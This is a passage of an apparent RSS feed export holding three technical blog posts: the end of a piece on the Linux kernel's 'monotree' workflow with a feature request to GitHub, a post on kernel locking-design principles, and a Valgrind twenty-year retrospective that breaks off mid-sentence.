the\nkobject hierarchy are handled by the right experts.</p>\n  </li>\n</ul>\n\n<p>At first this just looks like a complicated way to fill everyone’s disk space\nwith lots of stuff they don’t care about, but there’s a pile of compounding\nminor benefits that add up:</p>\n\n<ul>\n  <li>\n    <p>It’s dead easy to reorganize how you split things into sub-project, just\nupdate the MAINTAINERS file and you’re done. It’s a bit more work than it\nreally needs to be, since you might need to create a new repo, new mailing\nlists and a new bugzilla. That’s just an UI problem that github solved with\nthis neat little <em>fork</em> button.</p>\n  </li>\n  <li>\n    <p>It’s really really easy to reassign discussions on pull requests and issues\nbetween sub-projects, you simply adjust the Cc: list on your reply.\nSimilarly, doing cross-subsystem work is much easier to coordinate, since the\nsame pull request can be submitted to multiple sub-projects, and there’s just\none overall discussions (since the Msg-Ids: tags used for mailing list\nthreading are the same for everyone), despite that the mails are archived in a\npile of different mailing list archives, go through different mailing lists and\nland in a few thousand different inboxes. Making it easier to discuss topics\nand code across sub-projects avoids fragmentation and makes it much easier to\nspot where code sharing and refactoring would be beneficial.</p>\n  </li>\n  <li>\n    <p>Cross-subsystem work doesn’t need any kind of release dance. You simply change\nthe code, which is all in your one single repository. Note that this is\nstrictly more powerful than what a split repo setup allows you: For\nreally invasive refactorings you can still space out the work over multiple\nreleases, e.g. when there’s so many users that you can just change them all at\nonce without causing too big coordination pains.</p>\n\n    <p>A huge benefit of making refactoring and code sharing easier is that you don’t\nhave to carry around so much legacy gunk. That’s explained at length in the\nkernel’s <a href=\"https://dri.freedesktop.org/docs/drm/process/stable-api-nonsense.html#stable-kernel-source-interfaces\">no stable api\nnonsense</a>\ndocument.</p>\n  </li>\n  <li>\n    <p>It doesn’t prevent you from creating your own experimental additions, which is\none of the key benefits of the multi-repo setup. Add\nyour code in your own fork and leave it at that - no one ever forces you to push the code back,\nor push it into the one single repo or even to the main organization, because\nthere simply is no central repositories. This works really well, maybe too\nwell, as evidenced by the millions of code lines which are <em>out-of-tree</em> in\nthe various Android hardware vendor repositories.</p>\n  </li>\n</ul>\n\n<p>In short, I think this is a strictly more powerful model, since you can always\nfall back to doing things exactly like you would with multiple disjoint\nrepositories. Heck there’s even kernel drivers which are in their own\nrepository, disjoint from the main kernel tree, like the proprietary Nvidia\ndriver. Well it’s just a bit of source code glue around a blob, but since it\ncan’t contain anything from the kernel for legal reasons it is the perfect\nexample.</p>\n\n<h3>This looks like a monorepo horror show!</h3>\n\n<p>Yes and no.</p>\n\n<p>At first glance the linux kernel looks like a monorepo because it contains\neverything. And lots of people learned that monorepos are really painful,\nbecause past a certain size they just stop scaling.</p>\n\n<p>But looking closer, it’s very, very far away from a single git repository.\nJust looking at the upstream subsystem and driver repositories gives you a few\nhundred. If you look at the entire ecosystem, including hardware vendors,\ndistributions, other linux-based OS and individual products, you easily have a\nfew thousand major repositories, and many, many more in total. Not counting\nany git repo that’s just for private use by individual contributors.</p>\n\n<p>The crucial distinction is that linux has one single file hierarchy as the\nshared namespace across everything, but lots and lots of different repos for all\nthe different pieces and concerns. It’s a monotree with multiple repositories,\nnot a monorepo.</p>\n\n<h3>Examples, please!</h3>\n\n<p>Before I go into explaining why github cannot currently support this workflow,\nat least if you want to retain the benefits of the github UI and integration, we\nneed some examples of how this works in practice. The short summary is that it’s\nall done with git pull requests between maintainers.</p>\n\n<p>The simple case is percolating changes up the maintainer hierarchy, until it\neventually lands in a tree somewhere that is shipped. This is easy, because the\npull request only ever goes from one repository to the next, and so could be\ndone already using the current github UI.</p>\n\n<p>Much more fun are cross-subsystem changes, because then the pull request flow\nstops being an acyclic graph and morphs into a mesh. The first step is to get\nthe changes reviewed and tested by all the involved subsystems and their\nmaintainers. In the github flow this would be a pull request submitted to\nmultiple repositories simultaneously, with the one single discussion stream\nshared among them all. Since this is the kernel, this step is done through patch\nsubmission with a pile of different mailing lists and maintainers as\nrecipients.</p>\n\n<p>The way it’s reviewed is usually not the way it’s merged, instead one of the\nsubsystems is selected as the leading one and takes the pull requests, as long\nas all other maintainers agree to that merge path. Usually it’s the subsystem\nmost affected by a set of changes, but sometimes also the one that already has\nsome other work in-flight which conflicts with the pull request. Sometimes also\nan entirely new repository and maintainer crew is created, this often happens\nfor functionality which spans the entire tree and isn’t neatly contained to a\nfew files and directories in one place. A recent example is the <a href=\"http://git.infradead.org/users/hch/dma-mapping.git/commit/2e7d1098c00caebc8e31c4d338a49e88c979dd2b\">DMA mapping\ntree</a>,\nwhich tries to consolidate work that thus far has been spread across drivers,\nplatform maintainers and architecture support groups.</p>\n\n<p>But sometimes there’s multiple subsystems which would both conflict with a set\nof changes, and which would all need to resolve some non-trivial merge\nconflict. In that case the patches aren’t just directly applied (a rebasing pull\nrequest on github), but instead the pull request with just the necessary\npatches, based on a commit common to all subsystems, is merged into <em>all</em>\nsubsystem trees. The common baseline is important to avoid polluting a subsystem\ntree with unrelated changes. Since the pull is for a specific topic only, these\nbranches are commonly called <em>topic branches</em>.</p>\n\n<p>One example I was involved with added code for audio-over-HDMI support, which\nspanned both the graphics and sound driver subsystems. The same commits from the\nsame pull request where\nboth <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2844659842017c981f6e6f74aca3a7ebe10edebb\">merged into the Intel graphics\ndriver</a>\nand also <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c95e0c5a6fa36406fe5ba9a2d85a11c1483bfd0\">merged into the sound\nsubsystem</a>.</p>\n\n<p>An entirely different example that this isn’t insane is the <a href=\"https://www.microsoft.com/windows/\">only other relevant\ngeneral purpose large scale OS project</a> in\nthe world <em>also</em> decided to have a monotree, with a commit flow modelled similar\nto what’s going on in linux. I’m talking about the folks with such a huge tree\nthat they had to write an entire new <a href=\"https://github.com/Microsoft/GVFS\">GVFS</a>\nvirtual filesystem provider to support it …</p>\n\n<h2>Dear Github</h2>\n\n<p>Unfortunately github doesn’t support this workflow, at least not natively in the\ngithub UI. It can of course be done with just plain git tooling, but then you’re\nback to patches on mailing lists and pull requests over email, applied manually.\nIn my opinion that’s the single one reason why the kernel community cannot\nbenefit from moving to github. There’s also the minor issue of a few top\nmaintainers being extremely outspoken against github in general, but that’s a\nnot really a technical issue. And it’s not just the linux kernel, it’s all huge\nprojects on github in general which struggle with scaling, because github\ndoesn’t really give them the option to scale to multiple repositories, while\nsticking to with a monotree.</p>\n\n<p>In short, I have one simple feature request to github:</p>\n\n<blockquote>\n  <p>Please support pull requests and issue tracking spanning different repos of a\nmonotree.</p>\n</blockquote>\n\n<p>Simple idea, huge implications.</p>\n\n<h3>Repositories and Organizations</h3>\n\n<p>First, it needs to be possible to have multiple forks of the same repo in one\norganization. Just look at <a href=\"https://git.kernel.org/\">git.kernel.org</a>, most of\nthese repositories are not personal. And even if you might have different\norganizations for e.g. different subsystems, requiring an organization for each\nrepo is silly amounts of overkill and just makes access and user managed\nunnecessarily painful. In graphics for example we’d have 1 repo each for the\nuserspace test suite, the shared userspace library, and a common set of tools\nand scripts used by maintainers and developers, which would work in github. But\nthen we’d have the overall subsystem repo, plus a repository for core subsystem\nwork and additional repositories for each big drivers. Those would all be forks,\nwhich github doesn’t do. And each of these repos has a bunch of branches, at\nleast one for feature work, and another one for bugfixes for the current release\ncycle.</p>\n\n<p>Combining all branches into one repository wouldn’t do, since the point of\nsplitting repos is that pull requests and issues are separated, too.</p>\n\n<p>Related, it needs to be possible to establish the fork relationship after the\nfact. For new projects who’ve always been on github this isn’t a big deal. But\nlinux will be able to move at most a subsystem at a time, and there’s already\ntons of linux repositories on github which aren’t proper github forks of each\nanother.</p>\n\n<h3>Pull Requests</h3>\n\n<p>Pull request need to be attached to multiple repos at the same time, while\nkeeping one unified discussion stream. You can already reassign a pull request\nto a different branch of repo, but not at multiple repositories at the same\ntime. Reassigning pull requests is really important, since new contributors will\njust create pull requests against what they think is the main repo. Bots can\nthen shuffle those around to all the repos listed in e.g. a MAINTAINERS file for\na given set of files and changes a pull request contains. When I chatted with\ngithubbers I originally suggested they’d implement this directly. But I think as\nlong as it’s all scriptable that’s better left to individual projects, since\nthere’s no real standard.</p>\n\n<p>There’s a pretty funky UI challenge here since the patch list might be different\ndepending upon the branch the pull request is against. But that’s not always a\nuser error, one repo might simple have merged a few patches already.</p>\n\n<p>Also, the pull request status needs to be different for each repo. One\nmaintainer might close it without merging, since they agreed that the other\nsubsystem will pull it in, while the other maintainer will merge and close the\npull. Another tree might even close the pull request as invalid, since it\ndoesn’t apply to that older version or vendor fork. Even more fun, a pull\nrequest might get merged multiple times, in each subsystem with a\ndifferent merge commit.</p>\n\n<h3>Issues</h3>\n\n<p>Like pull requests, issues can be relevant for multiple repos, and might need to\nbe moved around. An example would be a bug that’s first reported against a\ndistribution’s kernel repository. After triage it’s clear it’s a driver bug\nstill present in the latest development branch and hence also relevant for that\nrepo, plus the main upstream branch and maybe a few more.</p>\n\n<p>Status should again be separate, since once push to one repo the bugfix isn’t\ninstantly available in all of them. It might even need additional work to get\nbackported to older kernels or distributions, and some might even decide that’s\nnot worth it and close it as <em>WONTFIX</em>, even thought the it’s marked as\nsuccessfully resolved in the relevant subsystem repository.</p>\n\n<h2>Summary: Monotree, not Monorepo</h2>\n\n<p>The Linux Kernel is not going to move to github. But moving the Linux way of\nscaling with a monotree, but mutliple repos, to github as a concept will be\nreally beneficial for all the huge projects already there: It’ll give them a\nnew, and in my opinion, more powerful way to handle their unique challenges.</p>"
    },
    "origin": {
        "streamId": 35,
        "title": "stuff by danvet",
        "htmlUrl": "http://blog.ffwll.ch/",
        "feedUrl": "https://blog.ffwll.ch/feed.xml"
    }
},
{
    "id": "http://blog.ffwll.ch/2022/07/locking-engineering.html",
    "timestampUsec": "1659344373818487",
    "categories": [
        "In-Depth Tech",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Locking Engineering Principles",
    "author": "",
    "published": 1658880000,
    "updated": 1658880000,
    "alternate": [
        {
            "href": "http://blog.ffwll.ch/2022/07/locking-engineering.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>For various reasons I spent the last two years way too much looking at code with\nterrible locking design and trying to rectify it, instead of a lot more actual\nbuilding cool things. Symptomatic that the last post here on my neglected blog\nis also a <a href=\"http://blog.ffwll.ch/2020/08/lockdep-false-positives.html\">rant on lockdep abuse</a>.</p>\n\n<p>I tried to distill all the lessons learned into some training slides, and this\ntwo part is the writeup of the same. There are some GPU specific rules, but I\nthink the key points should apply to at least apply to kernel drivers in\ngeneral.</p>\n\n<p>The first part here lays out some principles, the <a href=\"http://blog.ffwll.ch/2022/08/locking-hierarchy.html\">second part builds a locking\nengineering design pattern hierarchy</a> from the\nmost easiest to understand and maintain to the most nightmare inducing\napproaches.</p>\n\n<p>Also with locking engineering I mean the general problem of protecting data\nstructures against concurrent access by multiple threads and trying to ensure\nthat each sufficiently consistent view of the data it reads and that the updates\nit commits won’t result in confusion. Of course it highly depends upon the\nprecise requirements what exactly sufficiently consistent means, but figuring\nout these kind of questions is out of scope for this little series here.</p>\n\n\n<h2>Priorities in Locking Engineering</h2>\n\n<p>Designing a correct locking scheme is hard, validating that your code actually\nimplements your design is harder, and then debugging when - not if! - you\nscrewed up is even worse. Therefore the absolute most important rule in locking\nengineering, at least if you want to have any chance at winning this game, is to\nmake the design as simple and dumb as possible.</p>\n\n<h3>1. Make it Dumb</h3>\n\n<p>Since this is <em>the</em> key principle the entire second part of this series will go\nthrough a lot of different locking design patterns, from the simplest and\ndumbest and easiest to understand, to the most hair-raising horrors of\ncomplexity and trickiness.</p>\n\n<p>Meanwhile let’s continue to look at everything else that matters.</p>\n\n<h3>2. Make it Correct</h3>\n\n<p>Since simple doesn’t necessarily mean correct, especially when transferring a\nconcept from design to code, we need guidelines. On the design front the most\nimportant one is to <a href=\"http://blog.ffwll.ch/2020/08/lockdep-false-positives.html\">design for lockdep, and not fight\nit</a>, for which I already wrote a full length\nrant. Here I will only go through the main lessons: Validating locking by hand\nagainst all the other locking designs and nesting rules the kernel has overall\nis nigh impossible, extremely slow, something only few people can do with any\nchance of success and hence in almost all cases a complete waste of time. We\nneed tools to automate this, and in the Linux kernel this is lockdep.</p>\n\n<p>Therefore if lockdep doesn’t understand your locking design your design is at\nfault, not lockdep. Adjust accordingly.</p>\n\n<p>A corollary is that you actually need to teach lockdep your locking rules,\nbecause otherwise different drivers or subsystems will end up with defacto\nincompatible nesting and dependencies. Which, as long as you never exercise them\non the same kernel boot-up, much less same machine, wont make lockdep grumpy.\nBut it will make maintainers very much question why they are doing what they’re\ndoing.</p>\n\n<p>Hence at driver/subsystem/whatever load time, when CONFIG_LOCKDEP is enabled,\ntake all key locks in the correct order. One example for this relevant\nto GPU drivers is <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/dma-buf/dma-resv.c?h=v5.18#n685\">in the dma-buf\nsubsystem</a>.</p>\n\n<p>In the same spirit, at every entry point to your library or subsytem, or\nanything else big, validate that the callers hold up the locking contract with\n<code>might_lock(), might_sleep(), might_alloc()</code> and all the variants and\nmore specific implementations of this. Note that there’s a huge overlap between\nlocking contracts and calling context in general (like interrupt safety, or\nwhether memory allocation is allowed to call into direct reclaim), and since all\nthese functions compile away to nothing when debugging is disabled there’s\nreally no cost in sprinkling them around very liberally.</p>\n\n<p>On the implementation and coding side there’s a few rules of thumb to follow:</p>\n\n<ul>\n  <li>\n    <p>Never invent your own locking primitives, you’ll get them wrong, or at least\nbuild something that’s slow. The kernel’s locks are built and tuned by people\nwho’ve done nothing else their entire career, you wont beat them except in bug\ncount, and that by a lot.</p>\n  </li>\n  <li>\n    <p>The same holds for synchronization primitives - don’t build your own with a\n<code>struct wait_queue_head</code>, or worse, hand-roll your own wait queue.\nInstead use the most specific existing function that provides the\nsynchronization you need, e.g. <code>flush_work()</code> or\n<code>flush_workqueue()</code> and the enormous pile of variants available for\nsynchronizing against scheduled work items.</p>\n\n    <p>A key reason here is that very often these more specific functions already\ncome with elaborate lockdep annotations, whereas anything hand-roll tends to\nrequire much more manual design validation.</p>\n  </li>\n  <li>\n    <p>Finally at the intersection of “make it dumb” and “make it correct”, pick the\nsimplest lock that works, like a normal mutex instead of an read-write\nsemaphore. This is because in general, stricter rules catch bugs and design\nissues quicker, hence picking a very fancy “anything goes” locking primitives\nis a bad choice.</p>\n\n    <p>As another example pick spinlocks over mutexes because spinlocks are a lot\nmore strict in what code they allow in their critical section. Hence much less\nrisk you put something silly in there by accident and close a dependency loop\nthat could lead to a deadlock.</p>\n  </li>\n</ul>\n\n<h3>3. Make it Fast</h3>\n\n<p>Speed doesn’t matter if you don’t understand the design anymore in the future,\nyou need simplicity first.</p>\n\n<p>Speed doesn’t matter if all you’re doing is crashing faster. You need\ncorrectness before speed.</p>\n\n<p>Finally speed doesn’t matter where users don’t notice it. If you\nmicro-optimize a path that doesn’t even show up in real world workloads users\ncare about, all you’ve done is wasted time and committed to future maintenance\npain for no gain at all.</p>\n\n<p>Similarly optimizing code paths which should never be run when you instead\nimprove your design are not worth it. This holds especially for GPU drivers,\nwhere the real application interfaces are OpenGL, Vulkan or similar, and there’s\nan entire driver in the userspace side - the right fix for performance issues\nis very often to radically update the contract and sharing of responsibilities\nbetween the userspace and kernel driver parts.</p>\n\n<p>The big example here is GPU address patch list processing at command submission\ntime, which was necessary for old hardware that completely lacked any useful\nconcept of a per process virtual address space. But that has changed, which\nmeans virtual addresses can stay constant, while the kernel can still freely\nmanage the physical memory by manipulating pagetables, like on the CPU.\nUnfortunately one driver in the DRM subsystem instead spent an easy engineer\ndecade of effort to tune relocations, write lots of testcases for the resulting\ncorner cases in the multi-level fastpath fallbacks, and even more time handling\nthe impressive amounts of fallout in the form of bugs and future headaches due\nto the resulting unmaintainable code complexity …</p>\n\n<p>In other subsystems where the kernel ABI is the actual application contract\nthese kind of design simplifications might instead need to be handled between\nthe subsystem’s code and driver implementations. This is what we’ve done when\nmoving from the old kernel modesetting infrastructure to atomic modesetting.\nBut sometimes no clever tricks at all help and you only get true speed with a\nradically revamped uAPI - io_uring is a great example here.</p>\n\n<h2>Protect Data, not Code</h2>\n\n<p>A common pitfall is to design locking by looking at the code, perhaps just\nsprinkling locking calls over it until it feels like it’s good enough. The right\napproach is to design locking for the data structures, which means specifying\nfor each structure or member field how it is protected against concurrent\nchanges, and how the necessary amount of consistency is maintained across the\nentire data structure with rules that stay invariant, irrespective of how code\noperates on the data. Then roll it out consistently to all the functions,\nbecause the code-first approach tends to have a lot of issues:</p>\n\n<ul>\n  <li>\n    <p>A code centric approach to locking often leads to locking rules changing over\nthe lifetime of an object, e.g. with different rules for a structure or member\nfield depending upon whether an object is in active use, maybe just cached or\nundergoing reclaim. This is hard to teach to lockdep, especially when the\nnesting rules change for different states. Lockdep assumes that the\nlocking rules are completely invariant over the lifetime of the entire kernel,\nnot just over the lifetime of an individual object or structure even.</p>\n\n    <p>Starting from the data structures on the other hand encourages that locking\nrules stay the same for a structure or member field.</p>\n  </li>\n  <li>\n    <p>Locking design that changes depending upon the code that can touch the data\nwould need either complicated documentation entirely separate from the\ncode - so high risk of becoming stale. Or the explanations, if there are any\nare sprinkled over the various functions, which means reviewers need to\nreacquire the entire relevant chunks of the code base again to make sure they\ndon’t miss an odd corner cases.</p>\n\n    <p>With data structure driven locking design there’s a perfect, because unique\nplace to document the rules - in the kerneldoc of each structure or member\nfield.</p>\n  </li>\n  <li>\n    <p>A consequence for code review is that to recheck the locking design for a code\nfirst approach every function and flow has to be checked against all others,\nand changes need to be checked against all the existing code. If this is not\ndone you might miss a corner cases where the locking falls apart with a race\ncondition or could deadlock.</p>\n\n    <p>With a data first approach to locking changes can be reviewed incrementally\nagainst the invariant rules, which means review of especially big or complex\nsubsystems actually scales.</p>\n  </li>\n  <li>\n    <p>When facing a locking bug it’s tempting to try and fix it just in the affected\ncode. By repeating that often enough a locking scheme that protects data\nacquires code specific special cases. Therefore locking issues always\nneed to be first mapped back to new or changed requirements on the data\nstructures and how they are protected.</p>\n  </li>\n</ul>\n\n<p><em>The</em> big antipattern of how you end up with code centric locking is to protect\nan entire subsystem (or worse, a group of related subsystems) with a single\nhuge lock. The canonical example was the big kernel lock <em>BKL</em>, that’s gone, but\nin many cases it’s just replaced by smaller, but still huge locks like\n<code>console_lock()</code>.</p>\n\n<p>This results in a lot of long term problems when trying to adjust the locking\ndesign later on:</p>\n\n<ul>\n  <li>\n    <p>Since the big lock protects everything, it’s often very hard to tell what it\ndoes not protect. Locking at the fringes tends to be inconsistent, and due to\nthat its coverage tends to creep ever further when people try to fix bugs\nwhere a given structure is not consistently protected by the same lock.</p>\n  </li>\n  <li>\n    <p>Also often subsystems have different entry points, e.g. consoles can be\nreached through the console subsystem directly, through vt, tty subsystems and\nalso through an enormous pile of driver specific interfaces with the fbcon\nIOCTLs as an example. Attempting to split the big lock into smaller\nper-structure locks pretty much guarantees that different entry points have to\ntake the per-object locks in opposite order, which often can only be resolved\nthrough a large-scale rewrite of all impacted subsystems.</p>\n\n    <p>Worse, as long as the big subsystem lock continues to be in use no one is\nspotting these design issues in the code flow. Hence they will slowly get\nworse instead of the code moving towards a better structure.</p>\n  </li>\n</ul>\n\n<p>For these reasons big subsystem locks tend to live way past their justified\nusefulness until code maintenance becomes nigh impossible: Because no individual\nbugfix is worth the task to really rectify the design, but each bugfix tends to\nmake the situation worse.</p>\n\n<h2>From Principles to Practice</h2>\n\n<p>Stay tuned for next week’s installment, which will cover what these principles\nmean when applying to practice: Going through a large pile of locking design\npatterns from the most desirable to the most hair raising complex.</p>"
    },
    "origin": {
        "streamId": 35,
        "title": "stuff by danvet",
        "htmlUrl": "http://blog.ffwll.ch/",
        "feedUrl": "https://blog.ffwll.ch/feed.xml"
    }
},
{
    "id": "https://nnethercote.github.io/2022/07/27/twenty-years-of-valgrind",
    "timestampUsec": "1659344445258504",
    "categories": [
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "Twenty years of Valgrind",
    "author": "",
    "published": 1658880000,
    "updated": 1658880000,
    "alternate": [
        {
            "href": "https://nnethercote.github.io/2022/07/27/twenty-years-of-valgrind.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>It has been twenty years since Valgrind 1.0 was released.</p>\n\n<p><img src=\"https://nnethercote.github.io/images/2022/07/27/st-george-dragon.png\" alt=\"dragon\"></p>\n\n<p><a href=\"https://valgrind.org/\">The Valgrind website</a> says:</p>\n\n<blockquote>\n  <p>Valgrind is an instrumentation framework for building dynamic analysis tools.\nThere are Valgrind tools that can automatically detect many memory management\nand threading bugs, and profile your programs in detail. You can also use\nValgrind to build new tools.</p>\n</blockquote>\n\n<p>–</p>\n\n<p>I first met Julian Seward in late 2001. I had moved from Australia to Cambridge\nin the UK to pursue a PhD on the topic of “cache optimizations for functional\nlanguages”. The Cambridge Computer Laboratory is literally next door to a\nMicrosoft Research office, and I was soon interacting with the people there\nworking on the Glasgow Haskell Compiler. Julian was one of them.</p>\n\n<p>Shortly after that, Julian’s stint working on GHC came to a close. On his last\nday he dropped by my office in the Computer Laboratory to say goodbye. I asked\nwhat he would be doing now, and he said he was going to spend some time on a\nproject of his called Valgrind. “What’s Valgrind?” I asked. It was one of those\nthis-will-change-your-life moments.</p>\n\n<p>–</p>\n\n<p>In the mid-90s Julian wrote the <a href=\"https://en.wikipedia.org/wiki/Bzip2\">bzip2 compression\nutility</a>. He had spent some time\n<a href=\"https://ieeexplore.ieee.org/document/838157\">investigating</a> its cache\nbehaviour in order to make it faster. While doing this he created a cache\nprofiling tool called cacheprof. It parsed and annotated assembly code in order\nto add instrumentation code, gave line-by-line annotations of cache misses in\nyour source code, and came with a wrapper around gcc to make its usage\nstraightforward. (Section 7 of the <a href=\"https://nnethercote.github.io/doc/cacheprof.html\">cacheprof docs</a> have\nmore details about its origins.)</p>\n\n<p>Julian was also a fan of <a href=\"https://en.wikipedia.org/wiki/PurifyPlus\">Purify</a>, a\ncommercial tool that detected memory errors in programs at runtime and ran on\nSolaris. He hoped that someone would make an open source version for x86/Linux,\nbut eventually decided to do it himself. He had some experience with an x86\nbinary interpreter called Heimdall, but knew that binary interpretation was too\nslow to be practical. Perhaps JIT compilation could help?</p>\n\n<p>After a great deal of effort he had a working memory error detector, which\nended up with the name Valgrind. It was language independent and didn’t require\nany pre-instrumentation of source code. It worked pretty well, could handle\nlarge programs, and was getting some use from KDE developers.</p>\n\n<p>All this was an impressive achievement, because Valgrind has to do a lot of\nclever and/or nasty low-level things to work. It has to intercept every\ninstruction executed by a client program without ever losing control, even in\nthe face of syscalls, signals, and longjmp. And on top of that it has to add\nlarge amounts of instrumentation to maintain metadata about literally every bit\nof data the client program manipulates.</p>\n\n<p>–</p>\n\n<p>When Julian showed me Valgrind I thought it was pretty cool. I got a copy of\nthe code and submitted a few small improvements.</p>\n\n<p>I had been using cacheprof myself, but its assembly annotation approach was\nfragile and didn’t provide any coverage for system libraries. Not long after\nlearning about Valgrind I realised its dynamic binary instrumentation could\nprovide a more robust foundation for a cache profiling tool. I wrote Cachegrind\nand it was committed into the repository in April 2002.</p>\n\n<p>In July 2002, Valgrind 1.0 was\nreleased. The\n<a href=\"https://developers.slashdot.org/story/02/07/28/1833225/valgrind-100-released\">SlashDot post</a> said:</p>\n\n<blockquote>\n  <p>Valgrind is a C/C++ programmer’s dream come true: effortless memory\nallocation checking, uninitialised memory access, leaks etc. Purify for Linux\nhas arrived, only better: contrary to its commercial (non-Linux) sibling,\nchecking is performed directly on the executable, no re-linking necessary.</p>\n</blockquote>\n\n<p>At this point Valgrind did two things. By default it would look for memory\nerrors, but you could invoke Cachegrind with the <code>--cachesim</code> option. The\nintegration between the two modes was clunky, but both were useful.</p>\n\n<p>I then realised there was a potential clean split between the generic\ninstrumentation code and the tool-specific code. A few months later I made this\nsplit, which opened up a new world of possibilities. Memcheck was born: it\nbecame the name of the tool that did the original memory checking, and Valgrind\nbecame the name of the entire system. (Having said that, even today “Valgrind”\nand “Memcheck” are basically synonymous.) And Cachegrind was no longer bolted\non as an awkward extra piece.</p>\n\n<p>We called this the “core/skin split”. These names were my choice, inspired by\nthe custom UI “skins” you could put on software MP3 players at the time. A\nwhile later we realised “skin” was a dumb and confusing name, and we switched\nto “tool”. The name “core” has stuck, although we changed the name of the\ndirectory holding the core code from <code>core</code> to <code>coregrind</code> after learning that\nsome Linux systems were configured to periodically delete any file named\n<code>core</code>, on the assumption that such files are core dumps!</p>\n\n<p>Around this time we were joined by many talented folks who made important\ncontributions. In particular, Jeremy Fitzhardinge greatly improved the tricky\nintersection point of threads, system calls, and signals, and Tom Hughes fixed\nmany early bugs and improved debuginfo reading.</p>\n\n<p>More tools followed.</p>\n\n<ul>\n  <li>Julian wrote a data race detector called Helgrind.</li>\n  <li>Josef Weidendorfer wrote a souped-up version of Cachegrind called Callgrind.</li>\n  <li>In 2003 I wrote Massif, a heap profiler.</li>\n  <li>In 2007 Bart Van Assche wrote DRD, a different kind of race detector.</li>\n  <li>In 2010 Julian wrote\n<a href=\"https://blog.mozilla.org/jseward/2010/12/05/fun-n-games-with-dhat/\">DHAT</a>, a\ndifferent heap profiler. It could do some incredible stuff but the text-based\noutput was clunky. In 2019 I\n<a href=\"https://blog.mozilla.org/nnethercote/2019/04/17/a-better-dhat/\">overhauled</a>\nit to have a much nicer UI.</li>\n  <li>Various other lesser-known tools have been written, some of which were used\nas the basis for <a href=\"https://valgrind.org/docs/pubs.html\">research papers</a>.</li>\n</ul>\n\n<p>–</p>\n\n<p>After the core/tool split I switched the topic of my PhD away from functional\nprogramming. I finished my dissertation, entitled <a href=\"https://nnethercote.github.io/pubs/phd2004.pdf\">Dynamic Binary Analysis and\nInstrumentation</a>, in late 2004.\nI wouldn’t recommend reading it today, except perhaps chapter 3 which is a\ndecent description of how Cachegrind works. However, it was enough for me to\ngraduate and forevermore tell people that, literally, “I have a PhD in\nValgrind”. (This was a three year UK PhD, rather than a brutal six-or-more year\nUS PhD. To any potential graduate students reading this: 10/10, would\nrecommend.)</p>\n\n<p>In 2005 we published a paper at USENIX entitled <a href=\"https://nnethercote.github.io/pubs/memcheck2005.pdf\">Using Valgrind to detect\nundefined value errors with bit-precision</a>. We only\nlearned about the conference two days before the paper deadline, when an\norganiser of the co-located FREENIX workshop suggested we submit an abstract\nfor a paper about Valgrind to FREENIX. We proposed submitting a paper to USENIX\ninstead and were told “it’s not possible to do a USENIX paper in two days”.\nForty-eight frantic hours later we did and it was accepted, hooray!</p>\n\n<p>That paper focused Memcheck’s definedness checking. This is the part that\ntracks the definedness of every bit of data that a client program touches, and\ndetermines if the client program does anything dangerous with undefined or\npartially-defined values, such as branching on a condition that uses an\nundefined value, or passing an undefined value to a system call, or using an\nundefined value as an address in a memory operation. It’s a very elegant system\nthat Julian invented, combining both speed and precision. Even today, it’s\nstill a unique advantage of Memcheck over similar checking tools.</p>\n\n<p>In 2007 we published two papers. The first paper was at PLDI, entitled\n<a href=\"https://nnethercote.github.io/pubs/valgrind2007.pdf\">Valgrind: A Framework for Heavyweight Dynamic Binary\nInstrumentation</a>. This one took a lot longer than two\ndays. It’s still the best overview of Valgrind’s internals, and the most cited\npaper about Valgrind. Ten years later, it won a <a href=\"https://www.sigplan.org/Awards/PLDI/\">most influential\npaper</a> <del>weapon</del> award. I sure wasn’t\nexpecting that.</p>\n\n<p><img src=\"https://nnethercote.github.io/images/2022/07/27/pldi-award.jpg\" alt=\"award\" width=\"350\"></p>\n\n<p>The second paper was at VEE, entitled <a href=\"https://nnethercote.github.io/pubs/shadow-memory2007.pdf\">How to Shadow Every Byte of Memory Used\nby a Program</a>. It gives a nice overview of how\nMemcheck tracks extra state about every value in memory.</p>\n\n<p>There were some other awards, too.</p>\n\n<ul>\n  <li>In 2004 Valgrind won a merit (bronze) Open Source Award. (This\n<a href=\"https://www.techrepublic.com/article/open-source-awards-2004-julian-seward-for-valgrind/\">interview with\nJulian</a>\nfrom the time has some good historical information.)</li>\n  <li>In 2006 Julian won a <a href=\"https://developers.google.com/open-source/osa\">Google-O’Reilly Open Source\nAward</a> for “Best Toolmaker”.</li>\n  <li>In 2008 Valgrind won <a href=\"https://linuxdevices.org/cross-platform-tools-vendor-announces-awards-earnings/\">TrollTech’s inaugural Qt Open Source Development\nAward</a>\nfor the best open source development tool.</li>\n</ul>\n\n<p>–</p>\n\n<p>By 2010 I was fully out of academia and no longer writing research papers.\nJulian and I had both ended up at Mozilla, where I worked for twelve years and\nwhere Julian still is. Our involvement in Valgrind has gradually declined—mine\nmuch earlier than Julian’s—and our statuses today would best be described as\n“emeritus”. There have been many other\n<a href=\"https://valgrind.org/info/developers.html\">contributors</a> over the years, and\nMark Wielaard is today the lead maintainer.</p>\n\n<p>–</p>\n\n<p>It’s both delightful and surreal to see that Valgrind is still in wide use\ntoday. Julian’s original goal was to raise the bar when it came to correctness\nfor C and C++ programs. This has clearly been a huge success. Memcheck has\nfound countless bugs in countless programs, and is a standard part of the\ntesting setup for many of them.</p>\n\n<p>It did take a while to penetrate, though. In 2005 I did a postdoc where I\nworked on a project involving novel hardware design. There were several C\nprograms that simulated the hardware being designed. Students would run the\nprograms overnight to simulate a small amount of machine time. Sometimes when\nthey returned in the morning the simulations would have crashed, which was a\nbig time waster. I suggested they try Memcheck, which found a few problems that\nthey fixed, and the programs stopped crashing. But the response wasn’t a “that\nfixed the problem!” so much as a “huh, that problem seems to have gone away”.</p>\n\n<p>Thankfully, with time, the value of Memcheck has become more deeply\nappreciated. I’m pretty sure that ASan was directly inspired by Memcheck. ASan\nuses static instrumentation, which means it is faster than Memcheck but has\nincomplete coverage, e.g. for runtime generated code and system libraries. For\nthis reason it does what Memcheck does except the definedness checking, because\nthat part requires 100% instrumentation coverage to work 